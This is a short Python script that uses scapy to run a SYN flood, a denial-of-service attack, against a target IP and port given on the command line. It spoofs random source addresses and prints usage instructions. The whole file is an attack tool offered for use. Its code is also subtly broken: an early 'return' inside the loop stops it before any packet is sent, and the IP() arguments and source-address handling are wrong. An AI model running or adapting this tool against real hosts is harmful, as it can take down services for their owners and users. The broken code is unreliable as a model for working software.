import sys
import random 
from scapy.all import *


def syn_flood(target_ip, target_port, packs_counter):
    successful_packs = 0
    for _ in range(packs_counter):
        print("INIT SYN FLOOD")
        # Scapy setup 
        """
        Below is an example of scapy IP and TCP object.
        Objects do not function when inserted as parameter in send().
        Inserting them directly to send seems to work.
        """
        # IP_Packet = IP ()
        # IP_Packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))  # random source ip
        # IP_Packet.dst = target_ip
        # TCP_Packet = IP ()
        # TCP_Packet.sport = random.randint(1000, 9000)  # random send port 
        # TCP_Packet.dport = target_port
        # TCP_Packet.flags = "S"
        # TCP_Packet.seq = random.randint(1000, 9000)  # random send sequence
        # TCP_Packet.window = random.randint(1000, 9000)  # random window

        src_ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
        src_ip = bytes(map(int, src_ip.split(".")))
        return
        tcp_port = random.randint(1000, 9000)
        sequence = random.randint(1000, 9000)
        window = random.randint(1000, 9000)
        
        send(IP(src_ip, target_ip)/TCP(sport=tcp_port, dport=target_port, flags="S", seq=sequence, window=window), verbose=0)
        successful_packs += 1

    print("%s packets have been sent | @%s | port: %s " %(successful_packs, target_ip, target_port))


if __name__ == "__main__":
    print("Type on cmd: python syn_flood targer_ip target_port package_number, python3 on linux term")
    syn_flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
